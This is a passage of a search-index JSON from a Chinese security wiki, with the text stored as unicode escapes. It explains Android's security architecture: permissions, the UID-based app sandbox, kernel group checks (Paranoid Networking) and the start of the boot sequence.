\u5185\u6838\u5c42\u63d0\u4f9b\u7684\u5f3a\u5236\u673a\u5236\uff0c\u6709\u6548\u5730\u4f7f\u7528\u6c99\u7bb1\uff0c\u5c06\u5e94\u7528\u7a0b\u5e8f\u4e0e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u548c\u7cfb\u7edf\u7ec4\u4ef6\u9694\u79bb\u3002 \u540c\u65f6\uff0c\u9700\u8981\u6709\u6548\u7684\u901a\u4fe1\u534f\u8bae\u6765\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u91cd\u7528\u5e94\u7528\u7ec4\u4ef6\u5e76\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5355\u5143\u4ea4\u4e92\u3002 \u8be5\u534f\u8bae\u79f0\u4e3a\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\uff0c\u56e0\u4e3a\u5b83\u80fd\u591f\u4fc3\u8fdb\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u4ea4\u4e92\u3002 \u5728 Android \u4e2d\uff0c\u6b64\u534f\u8bae\u5728 Android \u4e2d\u95f4\u4ef6\u5c42\u5b9e\u73b0\uff08\u5728 Linux \u5185\u6838\u5c42\u4e0a\u53d1\u5e03\u7684\u7279\u6b8a\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002 \u6b64\u5c42\u7ea7\u7684\u5b89\u5168\u6027\u7531IPC \u5f15\u7528\u76d1\u63a7\u5668\u63d0\u4f9b\u3002 \u5f15\u7528\u76d1\u63a7\u5668\u8c03\u89e3\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\uff0c\u5e76\u63a7\u5236\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u8bbf\u95ee\u7cfb\u7edf\u7684\u7ec4\u4ef6\u548c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728 Android \u4e2d\uff0cIPC \u5f15\u7528\u76d1\u63a7\u5668\u9075\u5faa\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\uff08MAC\uff09\u8bbf\u95ee\u63a7\u5236\u7c7b\u578b\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 Android \u5e94\u7528\u90fd\u5728\u4f4e\u7279\u6743\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ea\u80fd\u8bbf\u95ee\u4e00\u7ec4\u6709\u9650\u7684\u7cfb\u7edf\u529f\u80fd\u3002 Android \u64cd\u4f5c\u7cfb\u7edf\u63a7\u5236\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u4e0d\u5229\u5f71\u54cd[3]\u3002 \u8be5\u63a7\u5236\u4ee5\u4e0d\u540c\u7684\u5f62\u5f0f\u5b9e\u73b0\uff0c\u5176\u4e2d\u4e00\u4e9b\u5728\u4ee5\u4e0b\u7ae0\u8282\u4e2d\u8be6\u7ec6\u63cf\u8ff0\u3002 \u8fd8\u6709\u4e00\u90e8\u5206\u53d7\u4fdd\u62a4\u7684\u7cfb\u7edf\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u6444\u50cf\u5934\uff0c\u7535\u8bdd\u6216 GPS \u529f\u80fd\uff09\uff0c\u5176\u8bbf\u95ee\u6743\u9650\u5e94\u8be5\u63d0\u4f9b\u7ed9\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3002 \u7136\u800c\uff0c\u8fd9\u79cd\u8bbf\u95ee\u5e94\u4ee5\u53d7\u63a7\u7684\u65b9\u5f0f\u63d0\u4f9b\u3002 \u5728 Android \u4e2d\uff0c\u8fd9\u79cd\u63a7\u5236\u4f7f\u7528\u6743\u9650\u6765\u5b9e\u73b0\u3002 \u57fa\u672c\u4e0a\uff0c\u6bcf\u4e2a\u63d0\u4f9b\u53d7\u4fdd\u62a4\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u7684\u654f\u611f API \u90fd\u88ab\u5206\u914d\u6709\u4e00\u4e2a\u6743\u9650\uff08Permission\uff09- \u5b83\u662f\u552f\u4e00\u7684\u5b89\u5168\u6807\u7b7e\u3002 \u6b64\u5916\uff0c\u53d7\u4fdd\u62a4\u7279\u6027\u8fd8\u53ef\u80fd\u5305\u62ec\u5176\u4ed6\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u4e3a\u4e86\u4f7f\u7528\u53d7\u4fdd\u62a4\u7684\u529f\u80fd\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u5fc5\u987b\u5728\u6587\u4ef6 AndroidManifest.xml \u4e2d\u8bf7\u6c42\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\uff0cAndroid \u64cd\u4f5c\u7cfb\u7edf\u5c06\u89e3\u6790\u6b64\u6587\u4ef6\uff0c\u5e76\u5411\u7528\u6237\u63d0\u4f9b\u6b64\u6587\u4ef6\u4e2d\u58f0\u660e\u7684\u6743\u9650\u5217\u8868\u3002 \u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u88c5\u6839\u636e\u201c\u5168\u6709\u6216\u5168\u65e0\"\u539f\u5219\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u4ec5\u5f53\u63a5\u53d7\u6240\u6709\u6743\u9650\u65f6\u624d\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002 \u5426\u5219\uff0c\u5c06\u4e0d\u4f1a\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002 \u6743\u9650\u4ec5\u5728\u5b89\u88c5\u65f6\u6388\u4e88\uff0c\u4ee5\u540e\u65e0\u6cd5\u4fee\u6539\u3002 \u4f5c\u4e3a\u6743\u9650\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u8003\u8651\u9700\u8981\u76d1\u63a7 SMS \u4f20\u5165\u6d88\u606f\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c AndroidManifest.xml \u6587\u4ef6\u5fc5\u987b\u5728 \u6807\u7b7e\u4e2d\u5305\u542b\u4ee5\u4e0b\u58f0\u660e\uff1a android.permission.RECEIVE SMS","title":"1.2 Android \u4e00\u822c\u5b89\u5168\u8bf4\u660e"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android-linux","text":"","title":"\u7b2c\u4e8c\u7ae0 Android Linux \u5185\u6838\u5c42\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#21","text":"\u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a Android \u5e94\u7528\u5b89\u88c5\u7684\u8fc7\u7a0b\u3002 Android \u5e94\u7528\u4ee5 Android \u8f6f\u4ef6\u5305\uff08 .apk \uff09\u6587\u4ef6\u7684 \u5f62\u5f0f\u5206\u53d1\u3002 \u4e00\u4e2a\u5305\u7531 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8d44\u6e90\uff0c\u672c\u5730\u5e93\u548c\u6e05\u5355\u6587\u4ef6\u7ec4\u6210\uff0c\u5e76\u7531\u5f00\u53d1\u8005\u7b7e\u540d\u6765 \u7b7e\u540d\u3002 \u6709\u4e09\u4e2a\u4e3b\u8981\u5a92\u4ecb\u53ef\u4ee5\u5728 Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u8bbe\u5907\u4e0a\u5b89\u88c5\u8f6f\u4ef6\u5305\uff1a Google Play \u8f6f\u4ef6\u5305\u5b89\u88c5\u7a0b\u5e8f adb install \u5de5\u5177 Google Play \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5e94\u7528\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b\u67e5\u627e\u7531\u7b2c\u4e09\u65b9\u5f00\u53d1\u4eba\u5458\u4e0a\u4f20\u5230\u5e02\u573a\u7684\u5e94\u7528\uff0c\u4ee5\u53ca\u5b89\u88c5\u8be5\u5e94\u7528\u7684\u529f\u80fd\u3002\u867d\u7136\u5b83\u4e5f\u662f\u7b2c\u4e09\u65b9\u5e94\u7528\uff0c\u4f46 Google Play \u5e94\u7528\uff08\u56e0\u4e3a\u4f7f\u7528\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u76f8\u540c\u7684\u7b7e\u540d\u8fdb\u884c\u7b7e\u540d\uff09\u53ef\u8bbf\u95ee Android \u7684\u53d7\u4fdd\u62a4\u7ec4\u4ef6\uff0c\u800c\u5176\u4ed6\u7b2c\u4e09\u65b9\u5e94\u7528\u5219\u7f3a\u5c11\u8fd9\u4e9b\u7ec4\u4ef6\u3002 \u5982\u679c\u7528\u6237\u4ece\u5176\u4ed6\u6765\u6e90\u5b89\u88c5\u5e94\u7528\uff0c\u5219\u901a\u5e38\u9690\u5f0f\u4f7f\u7528\u8f6f\u4ef6\u5305\u5b89\u88c5\u7a0b\u5e8f\u3002\u6b64\u7cfb\u7edf\u5e94\u7528\u63d0\u4f9b\u4e86\u7528\u4e8e\u542f\u52a8\u8f6f\u4ef6\u5305\u5b89\u88c5\u8fc7\u7a0b\u7684\u754c\u9762\u3002\u7531 Android \u63d0\u4f9b\u7684 adb install \u5de5\u5177\u4e3b\u8981\u7531\u7b2c\u4e09\u65b9\u5e94\u7528\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u3002\u867d\u7136\u524d\u4e24\u4e2a\u5a92\u4ecb\u9700\u8981\u7528\u6237\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u540c\u610f\u6743\u9650\u5217\u8868\uff0c\u4f46\u540e\u8005\u4f1a\u5b89\u9759\u5730\u5b89\u88c5\u5e94\u7528\u3002\u8fd9\u5c31\u662f\u5b83\u4e3b\u8981\u7528\u4e8e\u5f00\u53d1\u5de5\u5177\u7684\u539f\u56e0\uff0c\u65e8\u5728\u5c06\u5e94\u7528\u5b89\u88c5\u5728\u8bbe\u5907\u4e0a\u8fdb\u884c\u6d4b\u8bd5\u3002\u8be5\u8fc7\u7a0b\u5982\u56fe\u4e0a\u534a\u90e8\u5206\u6240\u793a\u3002\u6b64\u56fe\u663e\u793a\u4e86 Android \u5b89\u5168\u4f53\u7cfb\u7ed3\u6784\u7684\u66f4\u8be6\u7ec6\u7684\u6982\u8ff0\u3002\u6211\u4eec\u5c06\u5728\u672c\u6587\u4e2d\u53c2\u8003\u5b83\u6765\u89e3\u91ca\u8fd9\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u7279\u6027\u3002 \u5728 Linux \u5185\u6838\u5c42\u914d\u7f6e\u5e94\u7528\u6c99\u7bb1\u7684\u8fc7\u7a0b\u5982\u4e0b\u3002 \u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e2a\u5305\u90fd\u4f1a\u88ab\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u7528\u6237\u6807\u8bc6\u7b26\uff08UID\uff09\u548c\u7ec4\u6807\u8bc6\u7b26\uff08GID\uff09\uff0c\u5728\u8bbe\u5907\u7684\u5e94\u7528\u751f\u547d\u5468\u671f\u5185\u4e0d\u4f1a\u66f4\u6539\u3002 \u56e0\u6b64\uff0c\u5728Android \u4e2d\u6bcf\u4e2a\u5e94\u7528\u90fd\u6709\u4e00\u4e2a\u76f8\u5e94\u7684 Linux \u7528\u6237\u3002 \u7528\u6237\u540d\u9075\u5faa\u683c\u5f0f app_x \uff0c\u5e76\u4e14\u8be5\u7528\u6237\u7684UID \u7b49\u4e8e Process.FIRST_APPLICATION_UID + x \uff0c\u5176\u4e2d Process.FIRST_APPLICATION_UID \u5e38\u91cf\u5bf9\u5e94\u4e8e 10000 \u3002\u4f8b\u5982\uff0c\u5728\u56fe 2.1 \u4e2d\uff0c ex1.apk \u5305\u5728\u5b89\u88c5\u671f\u95f4\u83b7\u5f97\u4e86\u7528\u6237\u540d app 1 \uff0cUID \u7b49\u4e8e10001 \u5728 Linux \u4e2d\uff0c\u5185\u5b58\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u90fd\u53d7 Linux \u81ea\u5b9a\u4e49\u8bbf\u95ee\u63a7\u5236\uff08DAC\uff09\u7684\u7ea6\u675f\u3002\u8bbf\u95ee\u6743\u9650\u7531\u6587\u4ef6\u7684\u521b\u5efa\u8005\u6216\u6240\u6709\u8005\u4e3a\u4e09\u79cd\u7528\u6237\u7c7b\u578b\u8bbe\u7f6e\uff1a\u6587\u4ef6\u7684\u6240\u6709\u8005\uff0c\u4e0e\u6240\u6709\u8005\u5728\u540c\u4e00\u7ec4\u4e2d\u7684\u7528\u6237\u548c\u6240\u6709\u5176\u4ed6\u7528\u6237\u3002\u5bf9\u4e8e\u6bcf\u79cd\u7c7b\u578b\u7684\u7528\u6237\uff0c\u5206\u914d\u8bfb\uff0c\u5199\u548c\u6267\u884c\uff08 r-w-x \uff09\u6743\u9650\u7684\u5143\u7ec4\u3002\u56e0\u6b64\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u5e94\u7528\u90fd\u6709\u81ea\u5df1\u7684 UID \u548c GID\uff0cLinux \u5185\u6838\u5f3a\u5236\u5e94\u7528\u5728\u81ea\u5df1\u7684\u9694\u79bb\u5730\u5740\u7a7a\u95f4\u5185\u6267\u884c\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5e94\u7528\u552f\u4e00\u7684 UID \u548c GID \u7531 Linux \u5185\u6838\u4f7f\u7528\uff0c\u4ee5\u5b9e\u73b0\u4e0d\u540c\u5e94\u7528\u4e4b\u95f4\u7684\u8bbe\u5907\u8d44\u6e90\uff08\u5185\u5b58\uff0cCPU \u7b49\uff09\u7684\u516c\u5e73\u5206\u79bb\u3002\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u4e5f\u4f1a\u83b7\u5f97\u81ea\u5df1\u7684\u4e3b\u76ee\u5f55\uff0c\u4f8b\u5982 /data/data/package_name \uff0c\u5176\u4e2d package_name \u662f Android \u8f6f\u4ef6\u5305\u7684\u540d\u79f0\uff0c\u4f8b \u5982 com.ex.ex1 \uff0c\u5728 Android \u4e2d\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5939\u662f\u5185\u90e8\u5b58\u50a8\u76ee\u5f55\uff0c\u5176\u4e2d\u5e94\u7528\u5c06\u79c1\u6709\u6570\u636e\u653e\u5728\u91cc\u9762\u3002\u5206\u914d\u7ed9\u6b64\u76ee\u5f55\u7684 Linu x \u6743\u9650\u53ea\u5141\u8bb8\u201c\u6240\u6709\u8005\"\u5e94\u7528\u5199\u5165\u5e76\u8bfb\u53d6\u6b64\u5f55\u3002\u6709\u4e00\u4e9b\u4f8b\u5916\u5e94\u8be5\u63d0\u5230\u3002\u4f7f\u7528\u76f8\u540c\u8bc1\u4e66\u7b7e\u540d\u7684\u5e94\u7528\u80fd\u591f\u5728\u5f7c\u6b64\u4e4b\u95f4\u5171\u4eab\u6570\u636e\uff0c\u53ef\u4ee5\u62e5\u6709\u76f8\u540c\u7684 UID \u6216\u751a\u81f3\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u3002 \u8fd9\u4e9b\u67b6\u6784\u51b3\u7b56\u5728 Linux \u5185\u6838\u5c42\u4e0a\u5efa\u7acb\u4e86\u9ad8\u6548\u7684\u5e94\u7528\u6c99\u7bb1\u3002 \u8fd9\u79cd\u7c7b\u578b\u7684\u6c99\u7bb1\u5f88\u7b80\u5355\uff0c\u5e76\u57fa\u4e8eLinux \u53ef\u9009\u8bbf\u95ee\u63a7\u5236\u6a21\u578b\uff08DAC\uff09\u7684\u9a8c\u8bc1\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u56e0\u4e3a\u6c99\u76d2\u5728 Linux \u5185\u6838\u5c42\u4e0a\u6267\u884c\uff0c\u672c\u5730\u4ee3\u7801\u548c\u64cd\u4f5c\u7cfb\u7edf\u5e94\u7528\u4e5f\u53d7\u5230\u672c\u7ae0[3]\u4e2d\u6240\u63cf\u8ff0\u7684\u8fd9\u4e9b\u7ea6\u675f\u7684\u7ea6\u675f\u3002","title":"2.1 \u5e94\u7528\u6c99\u76d2"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#22-linux","text":"\u901a\u8fc7\u5c06 Linux \u7528\u6237\u548c\u7ec4\u6240\u6709\u8005\u5206\u914d\u7ed9\u5b9e\u73b0\u6b64\u529f\u80fd\u7684\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u9650\u5236\u5bf9\u67d0\u4e9b\u7cfb\u7edf\u529f\u80fd\u7684\u8bbf\u95ee\u3002 \u8fd9\u79cd\u7c7b\u578b\u7684\u9650\u5236\u53ef\u4ee5\u5e94\u7528\u4e8e\u7cfb\u7edf\u8d44\u6e90\uff0c\u5982\u6587\u4ef6\uff0c\u9a71\u52a8\u7a0b\u5e8f\u548c\u5957\u63a5\u5b57\u3002 Android \u4f7f\u7528\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u548c\u7279\u5b9a\u7684\u5185\u6838\u8865\u4e01\uff08\u79f0\u4e3a Paranoid Networking\uff09[13]\u6765\u9650\u5236\u4f4e\u7ea7\u7cfb\u7edf\u529f\u80fd\u7684\u8bbf\u95ee\uff0c\u5982\u7f51\u7edc\u5957\u63a5\u5b57\uff0c\u6444\u50cf\u673a\u8bbe\u5907\uff0c\u5916\u90e8\u5b58\u50a8\u5668\uff0c\u65e5\u5fd7\u8bfb\u53d6\u80fd\u529b\u7b49\u3002 \u4f7f\u7528\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u8bbf\u95ee\u6587\u4ef6\u548c\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u9650\u5236\u8fdb\u7a0b\u5bf9\u8bbe\u5907\u67d0\u4e9b\u529f\u80fd\u7684\u8bbf\u95ee\u3002\u4f8b\u5982\uff0c\u8fd9\u79cd\u6280\u672f\u88ab\u5e94\u7528\u4e8e\u9650\u5236\u5e94\u7528\u5bf9\u8bbe\u5907\u76f8\u673a\u7684\u8bbf\u95ee\u3002 /dev/ cam \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u7684\u6743\u9650\u8bbe\u7f6e\u4e3a 0660 \uff0c\u5c5e\u4e8e root \u6240\u6709\u8005\u548c\u6444\u50cf\u673a\u6240\u6709\u8005\u7ec4\u3002\u8fd9\u610f\u5473\u7740\u53ea\u6709\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u6216\u5305\u542b\u5728\u6444\u50cf\u673a\u7ec4\u4e2d\u7684\u8fdb\u7a0b\u624d\u80fd\u8bfb\u53d6\u548c\u5199\u5165\u6b64\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3002\u56e0\u6b64\uff0c\u4ec5\u5305\u62ec\u5728\u76f8\u673a\u7ec4\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0e\u76f8\u673a\u4ea4\u4e92\u3002\u6743\u9650\u6807\u7b7e\u548c\u76f8\u5e94\u7ec4\u4e4b\u95f4\u7684\u6620\u5c04\u5728\u6587\u4ef6\u6846\u67b6 /base/data/etc/platform.xml \u4e2d\u5b9a\u4e49\uff0c\u6458\u5f55\u5982\u6e05\u5355 2.1 \u6240\u793a\u3002\u56e0\u6b64\uff0c\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u5df2\u8bf7\u6c42\u8bbf\u95ee\u6444\u50cf\u673a\u529f\u80fd\uff0c\u5e76\u4e14\u7528\u6237\u5df2\u6279\u51c6\u8be5\u5e94\u7528\u7a0b\u5e8f\uff0c\u5219\u8fd8\u4f1a\u4e3a\u6b64\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a\u6444\u50cf\u673a Linux \u7ec4 GID\uff08\u8bf7\u53c2\u9605\u6e05\u5355\uff09\u3002\u56e0\u6b64\uff0c\u6b64\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece /dev/cam \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u8bfb\u53d6\u4fe1\u606f\u3002 qa/\u3001/\u3001... <permissions> ... <permission name=\"android.permission.INTERNET\" > <group gid=\"inet\" /> </permission> <permission name=\"android.permission.CAMERA\" > <group gid=\"camera\" /> </permission><permission name=\"android.permission.READ_LOGS\" > <group gid=\"log\" /> </permission>...</permission> Android \u4e2d\u6709\u4e00\u4e9b\u5730\u65b9\u53ef\u4ee5\u7528\u4e8e\u8bbe\u7f6e\u6587\u4ef6\u3001\u9a71\u52a8\u548c Unix \u5957\u63a5\u5b57\u7684\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\uff1a init \u7a0b \u5e8f\uff0c init.rc \u914d\u7f6e\u6587\u4ef6\uff0c ueventd.rc \u914d\u7f6e\u6587\u4ef6\u548c\u7cfb\u7edf ROM \u6587\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u3002 \u5b83\u4eec\u5728\u7b2c 3 \u7ae0\u4e2d\u4f1a\u8be6\u7ec6\u8ba8\u8bba\u3002 \u5728\u4f20\u7edf\u7684 Linux \u53d1\u884c\u7248\u4e2d\uff0c\u5141\u8bb8\u6240\u6709\u8fdb\u7a0b\u542f\u52a8\u7f51\u7edc\u8fde\u63a5\u3002 \u540c\u65f6\uff0c\u5bf9\u4e8e\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5fc5\u987b\u63a7 \u5236\u5bf9\u7f51\u7edc\u529f\u80fd\u7684\u8bbf\u95ee\u3002 \u4e3a\u4e86\u5728 Android \u4e2d\u5b9e\u73b0\u6b64\u63a7\u5236\uff0c\u9700\u8981\u6dfb\u52a0\u7279\u6b8a\u7684\u5185\u6838\u8865\u4e01\uff0c\u5c06\u7f51\u7edc\u8bbe\u65bd\u7684\u8bbf\u95ee\u9650\u5236\u4e8e\u5c5e\u4e8e\u7279\u5b9a Linux \u7ec4\u6216\u5177\u6709\u7279\u5b9a Linux \u529f\u80fd\u7684\u8fdb\u7a0b\u3002 \u8fd9\u4e9b\u9488\u5bf9 Android \u7684 Linux\u5185\u6838\u8865\u4e01\u5df2\u7ecf\u83b7\u5f97\u4e86 Paranoid \u7f51\u7edc\u7684\u540d\u79f0\u3002 \u4f8b\u5982\uff0c\u5bf9\u4e8e\u8d1f\u8d23\u7f51\u7edc\u901a\u4fe1\u7684 AF_INET \u5957\u63a5\u5b57\u5730\u5740\u65cf\uff0c\u6b64\u68c0\u67e5\u5728 kernel/net/ipv4/af_inet.c \u6587\u4ef6\u4e2d\u6267\u884c\uff08\u53c2\u89c1\u6e05\u5355\u4e2d\u7684\u4ee3\u7801\u7247\u6bb5\uff09\u3002 Linux\u7ec4\u548c Paranoid \u7f51\u7edc\u7684\u6743\u9650\u6807\u7b7e\u4e4b\u95f4\u7684\u6620\u5c04\u4e5f\u5728 platform.xml \u6587\u4ef6\u4e2d\u8bbe\u7f6e\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u6e05\u5355\u4e2d\u7684\u7b2c 4 \u884c\uff09\u3002 1 ... 2 # ifdef CONFIG_ANDROID_PARANOID_NETWORK 3 # include < linux / android_aid . h > 4 5 static inline int current_has_network ( void ) 6 { 7 return in_egroup_p ( AID_INET ) || capable ( CAP_NET_RAW ) ; 8 } 9 # else 10 static inline int current_has_network ( void ) 11 { 12 return 1 ; 13 } 14 # endif 15 ... 16 17 /* 18 * Create an inet socket . 19 */ 20 21 static int inet create ( struct net * net , struct socket * sock , int protocol , 22 int kern ) 23 { 24 ... 25 if ( ! current_has_network () ) 26 return \u2212 EACCES ; 27 ... 28 } \u7c7b\u4f3c\u7684 Paranoid \u7f51\u7edc\u8865\u4e01\u4e5f\u9002\u7528\u4e8e\u9650\u5236\u8bbf\u95ee IPv6 \u548c\u84dd\u7259[19]\u3002 \u8fd9\u4e9b\u68c0\u67e5\u4e2d\u4f7f\u7528\u7684\u5e38\u91cf\u5728\u5185\u6838\u4e2d\u786c\u7f16\u7801\uff0c\u5e76\u5728 kernel/include/linux/android_aid.h \u6587\u4ef6\u4e2d\u89c4\u5b9a \u56e0\u6b64\uff0c\u5728 Linux \u5185\u6838\u5c42\uff0c\u901a\u8fc7\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5305\u542b\u5728\u7279\u6b8a\u9884\u5b9a\u4e49\u7684\u7ec4\u4e2d\u6765\u5b9e\u73b0 Android \u6743 \u9650\u3002 \u53ea\u6709\u6b64\u7ec4\u7684\u6210\u5458\u624d\u80fd\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u529f\u80fd\u3002 \u5728\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u671f\u95f4\uff0c\u5982\u679c\u7528\u6237\u5df2\u540c\u610f\u6240\u8bf7\u6c42 \u7684\u6743\u9650\uff0c\u5219\u8be5\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u5728\u76f8\u5e94\u7684 Linux \u7ec4\u4e2d\uff0c\u56e0\u6b64\u83b7\u5f97\u5bf9\u53d7\u4fdd\u62a4\u529f\u80fd\u7684\u8bbf\u95ee\u3002","title":"2.2 Linux \u5185\u6838\u5c42\u4e0a\u7684\u6743\u9650\u7ea6\u675f"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android_1","text":"","title":"\u7b2c\u4e09\u7ae0 Android \u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#31-android","text":"\u8981\u4e86\u89e3\u5728\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u4e0a\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u8fc7\u7a0b\uff0c\u9996\u5148\u5e94\u8003\u8651 Android \u8bbe\u5907\u7684\u5f15\u5bfc\u987a\u5e8f\u3002 \u8981\u6ce8\u610f\uff0c\u5728\u7b2c\u4e00\u6b65\u4e2d\uff0c\u8fd9\u4e2a\u987a\u5e8f\u53ef\u80fd\u4f1a\u56e0\u4e0d\u540c\u7684\u8bbe\u5907\u800c\u5f02\uff0c\u4f46\u662f\u5728 Linux \u5185\u6838\u52a0\u8f7d\u4e4b\u540e\uff0c\u8fc7\u7a0b\u901a\u5e38\u662f\u76f8\u540c\u7684\u3002 \u5f15\u5bfc\u8fc7\u7a0b\u7684\u6d41\u7a0b\u5982\u56fe \u5f53\u7528\u6237\u6253\u5f00\u667a\u80fd\u624b\u673a\u65f6\uff0c\u8bbe\u5907\u7684 CPU \u5904\u4e8e\u672a\u521d\u59cb\u5316\u72b6\u6001\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u5668\u4ece\u786c\u8fde\u7ebf\u5730\u5740\u5f00\u59cb\u6267\u884c\u547d\u4ee4\u3002\u8be5\u5730\u5740\u6307\u5411 Boot ROM \u6240\u5728\u7684 CPU \u7684\u5199\u4fdd\u62a4\u5b58\u50a8\u5668\u4e2d\u7684\u4e00\u6bb5\u4ee3\u7801\uff08\u53c2\u89c1\u56fe \u4e2d\u7684\u6b65\u9aa4 1\uff09\u3002\u4ee3\u7801\u9a7b\u7559\u5728 Boot ROM \u4e0a\u7684\u4e3b\u8981\u76ee\u7684\u662f\u68c0\u6d4b Boot Loader\uff08\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\uff09\u6240\u5728\u7684\u4ecb\u8d28[17]\u3002\u68c0\u6d4b\u5b8c\u6210\u540e\uff0cBoot ROM \u5c06\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff08\u4ec5\u5728\u8bbe\u5907\u901a\u7535\u540e\u53ef\u7528\uff09\uff0c\u5e76\u8df3\u8f6c\u5230\u5f15\u5bfc Boot Loader \u7684\u52a0\u8f7d\u4ee3\u7801\u3002\u53cd\u8fc7\u6765\uff0cBoot Loader \u5efa\u7acb\u4e86\u5916\u90e8RAM\uff0c\u6587\u4ef6\u7cfb\u7edf\u548c\u7f51\u7edc\u7684\u652f\u6301\u3002\u4e4b\u540e\uff0c\u5b83\u5c06 Linux \u5185\u6838\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u5b83\u3002 Linux \u5185\u6838\u521d\u59cb\u5316\u73af\u5883\u6765\u8fd0\u884c C 